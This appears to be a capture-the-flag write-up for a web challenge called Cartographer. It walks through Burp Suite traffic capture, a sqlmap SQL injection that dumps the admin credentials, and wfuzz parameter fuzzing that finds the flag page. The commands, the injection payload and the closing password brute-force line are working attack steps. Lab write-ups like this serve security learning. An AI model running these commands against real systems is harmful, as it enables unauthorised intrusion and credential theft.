# WEB CHALLENGE: CARTOGRAPHER

## Challenge Description
Some underground hackers are developing a new command and control server. Can
you break in and see what they are up to?

```
host: 88.198.233.174 port:35067
```

<img src="login.jpg" width=500px/>

### BURPSUITE
Let's see if we can examine the HTTP traffic between us and the server by using
burpsuite as our browser proxy to understand what is being passed around..

```
<REQUEST>
POST / HTTP/1.1
Host: 88.198.233.174:35067
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://88.198.233.174:35067/
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

username=fake_usr&password=abc123
</REQUEST>

<RESPONSE>
HTTP/1.1 200 OK
Date: Mon, 04 Dec 2017 19:11:22 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 673
Connection: close
Content-Type: text/html; charset=UTF-8


<html>
<head>
    <title>Cartographer - Login</title>
    <link rel='stylesheet' href='style.css' type='text/css' />
</head>
<body>
    <div class="content-container">
        <div class="blur"></div>
    </div>
    <div class="loginform">
        <center>
            <img src="logo.png" /><br><br>
            <form method="post">
                <input class="textbox" type="text" name="username" placeholder="Username"><br><br>
                <input class="textbox" type="password" name="password" placeholder="Password"><br><br>
                <input class="loginbutton" type="submit" value="Login">
            </form>
        </center>
    </div>
</body>
</html>
</RESPONSE>
```

Okay.. that tells us that `username` and `password` are the variables being
passed to the server.

### SQLMAP - DISCOVERY

Let's use sql map to see if we can use an SQL injection exploit to discover
more about our target..

```
$ sqlmap -u http://88.198.233.174:35067 --method POST --data="username=blah&password=blah" --dbs --batch --tamper=space2comment --level 5 --risk 3
```

```
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.1.11#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 15:08:13

[15:08:13] [INFO] loading tamper script 'space2comment'
[15:08:13] [INFO] testing connection to the target URL
[15:08:14] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS/IDS
[15:08:14] [INFO] testing if the target URL is stable
[15:08:14] [INFO] target URL is stable
[15:08:14] [INFO] testing if POST parameter 'username' is dynamic
[15:08:15] [WARNING] POST parameter 'username' does not appear to be dynamic
[15:08:15] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[15:08:15] [INFO] testing for SQL injection on POST parameter 'username'
[15:08:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:08:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[15:08:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[15:09:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Generic comment)'
[15:09:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Generic comment)'
[15:09:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Generic comment) (NOT)'
[15:10:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[15:10:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
sqlmap got a 302 redirect to 'http://88.198.233.174:35067/panel.php?info=home'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N

[15:10:15] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --string="Is")
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[15:10:15] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[15:10:15] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[15:10:19] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[15:10:24] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[15:10:28] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[15:10:31] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[15:10:35] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[15:10:39] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[15:10:43] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[15:10:47] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[15:10:51] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[15:10:54] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
[15:10:54] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 854 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: username=-8955' OR 2657=2657#&password=blah
---
[15:11:02] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[15:11:02] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 (xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL Unknown
[15:11:02] [INFO] fetching database names
[15:11:02] [INFO] fetching number of databases
[15:11:02] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[15:11:02] [INFO] retrieved: 5
[15:11:04] [INFO] retrieved: information_schema
[15:11:38] [INFO] retrieved: cartographer
[15:12:01] [INFO] retrieved: mysql
[15:12:10] [INFO] retrieved: performance_schema
[15:12:44] [INFO] retrieved: sys
available databases [5]:
[*] cartographer
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys

[15:12:51] [INFO] fetched data logged to text files under '/home/fortyfunbobby/.sqlmap/output/88.198.233.174'

[*] shutting down at 15:12:51
```

So we found out that:

```
1. POST parameter `username` is vulnerable.
2. Backend DBMS is `MySQL`
3. Web Server OS is Linux Ubuntu 16.04 (xenial)
4. Web Server is Apache 2.4.18 
5. 5 DBs found: a. cartographer, b. information_schema, c. mysql, d. performance_schema, e. sys
```

### SQLMAP - DATABASE MINING
Now let's dump the `cartographer` database to see what we have..

```
$ sqlmap -u http://88.198.233.174:35067 --method POST --data="username=blah&password=blah" -D cartographer --dump all --batch
```

```
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.1.11#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 15:23:42

[15:23:42] [INFO] resuming back-end DBMS 'mysql' 
[15:23:42] [INFO] testing connection to the target URL
[15:23:42] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS/IDS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: username=-8955' OR 2657=2657#&password=blah
---
[15:23:42] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 (xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL unknown
[15:23:42] [INFO] fetching tables for database: 'cartographer'
[15:23:42] [INFO] fetching number of tables for database 'cartographer'
[15:23:43] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[15:23:43] [INFO] retrieved: 
sqlmap got a 302 redirect to 'http://88.198.233.174:35067/panel.php?info=home'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
[15:23:44] [INFO] retrieved: users
[15:23:53] [INFO] fetching columns for table 'users' in database 'cartographer'
[15:23:53] [INFO] retrieved: 2
[15:23:55] [INFO] retrieved: username
[15:24:13] [INFO] retrieved: password
[15:24:30] [INFO] fetching entries for table 'users' in database 'cartographer'
[15:24:30] [INFO] fetching number of entries for table 'users' in database 'cartographer'
[15:24:30] [INFO] retrieved: 1
[15:24:31] [INFO] retrieved: mypasswordisfuckinawesome123
[15:25:21] [INFO] retrieved: admin
Database: cartographer
Table: users
[1 entry]
+----------+------------------------------+
| username | password                     |
+----------+------------------------------+
| admin    | mypasswordisfuckinawesome123 |
+----------+------------------------------+

[15:25:30] [INFO] table 'cartographer.users' dumped to CSV file '/home/fortyfunbobby/.sqlmap/output/88.198.233.174/dump/cartographer/users.csv'
[15:25:30] [INFO] fetched data logged to text files under '/home/fortyfunbobby/.sqlmap/output/88.198.233.174'

[*] shutting down at 15:25:30
```

Nice.. that IS a very nice password.

### BURPSUITE - ANALYZING LOGIN
Using our newly found password, we are able to get past the login page and are
presented with a `Cartographer Is Still Under Construction!` page.

```
http://88.198.233.174:35130/panel.php?info=home
```
<img src="login-success.jpg" width=500px/>

Analyzing the server communication with Burpsuite, we see a cookie gets set
with `PHPSESSID=goa9r4gatjedo6df8uktgpclp7`.

```
<REQUEST>
GET /panel.php?info=home HTTP/1.1
Host: 88.198.233.174:35130
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://88.198.233.174:35130/
Cookie: PHPSESSID=goa9r4gatjedo6df8uktgpclp7
Connection: close
Upgrade-Insecure-Requests: 1
</REQUEST>
```

Tried to see if the PHPSESSID value had any meaning, but didn't get any where..

### WFUZZ

Observing that after successful login we land at a page that has `panel.php`
with parameter `info` and the value `home`.. we can try inputing random values
to see what happens.

```
http://88.198.233.174:35130/panel.php?info=foo
```

<img src="login-nofound.jpg" width=500px/>

Interesting, we get a `Not Found` page.. perhaps we can try to find some value
which results in a valid page?

Let's use wfuzz to iterate through different values for `info=` (need to ensure
we pass in the `PHPSESSID` cookie as a header that got us past the login
screen). We'll use the pattern "Not" from "Not Found" to filter out invalid
values.

```
$ wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/megabeast.txt --hs Not -H "Cookie:PHPSESSID=goa9r4gatjedo6df8uktgpclp7" http://88.198.233.174:35130/panel.php?info=FUZZ
```

```
********************************************************
* Wfuzz 2.2.3 - The Web Fuzzer                         *
********************************************************

Target: HTTP://88.198.233.174:35130/panel.php?info=FUZZ
Total requests: 45463

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

16817:  C=200     16 L	      28 W	    384 Ch	  "flag"
20310:  C=200     16 L	      30 W	    408 Ch	  "home"

Total time: 751.5835
Processed Requests: 45463
Filtered Requests: 45461
Requests/sec.: 60.48961

```

So fuzzing yields two valid values for the `info=` parameter, 1. `home` (which
we already know of) and 2. `flag`!!

```
http://88.198.233.174:35130/panel.php?info=flag
```

<img src="login-flag.jpg" width=500px/>

Would be interesting to try and brute force other POST request challenges in
the future with something like this..

```
$ wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 -d "username=admin&password=FUZZ" http://88.198.233.174:35130/
```
